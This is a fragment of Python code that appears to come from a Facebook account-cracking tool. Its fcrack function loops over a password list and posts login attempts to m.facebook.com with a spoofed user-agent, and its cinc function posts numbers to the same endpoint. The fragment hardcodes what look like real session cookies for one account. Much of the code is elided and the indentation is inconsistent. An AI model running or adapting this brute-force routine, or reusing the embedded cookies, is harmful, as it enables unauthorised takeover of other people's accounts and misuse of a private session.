...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
            ...
            'cookie': 'sb=nKBSYqRECxyL7RuJr8vc0xu1; datr=nKBSYvrx9hfYlie57qaPOHCi; dpr=1.25; c_user=100089252916634; xs=30%3Ap3DmCGpXSqBexA%3A2%3A1672937320%3A-1%3A-1; m_page_voice=100089252916634; fr=0hLscfSFT8A5vSA7Q.AWXl7FD7zzOjt1JLMAQKsIH4Gzs.Bjtru5.df.AAA.0.0.BjtwbW.AWW_NDF8QZY; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1672939295497%2C%22v%22%3A1%7D; x-referer=eyJyIjoiL2hvbWUucGhwIiwiaCI6Ii9ob21lLnBocCIsInMiOiJtb2JpbGUifQ%3D%3D; m_pixel_ratio=1.25; wd=994x486',
            ...
            'user-agent': ua}
			lo = session.post('https://m.facebook.com/?tbua=1',data=log_data,headers=header_freefb).text
...
def cinc():
    ...
    linex()
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'cnnum': nmbr}
    url = requests.post('https://m.facebook.com/?tbua=1',headers=head,data=data)
